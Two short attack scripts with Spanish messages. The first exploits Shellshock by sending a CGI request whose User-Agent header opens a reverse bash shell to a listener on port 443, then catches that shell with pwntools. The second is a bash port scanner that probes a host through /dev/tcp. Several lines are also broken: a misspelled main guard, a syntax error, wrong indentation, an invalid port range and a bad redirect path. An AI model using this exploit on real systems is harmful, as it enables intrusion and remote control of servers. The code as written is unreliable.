````python
#!/usr/bin/python3

from pwn import *
import requests, signal, sys, pdb, threading, time

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

main_url ="http://192.168.000.000/cgi-bin/underword"
lport = 443

def shellshock():

   headers = {
        'User-Agent': "() { :; }; echo; /bin/bash -i >& /dev/tcp/192.168.000.000/443 0>&1"
        }

        r = requests.get(main_url, headers=headers)

if __name__ == '___main__':

    try:
        threading.Thread(target=shellshock, args()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20)

    shell.interactive()
    ````

and HostDiscovery.sh

````bash
#!/bin/bash

# 10.10.0.0/24

for i in $(seq 1 254); do
        for port in $(seq 1 66535); do
        timeout 1 bash -c "echo '' > /dev/tcp/10.10.0.131/$port" &>dev/null && echo "[+] Port $port - OPEN" &
done; wait
````
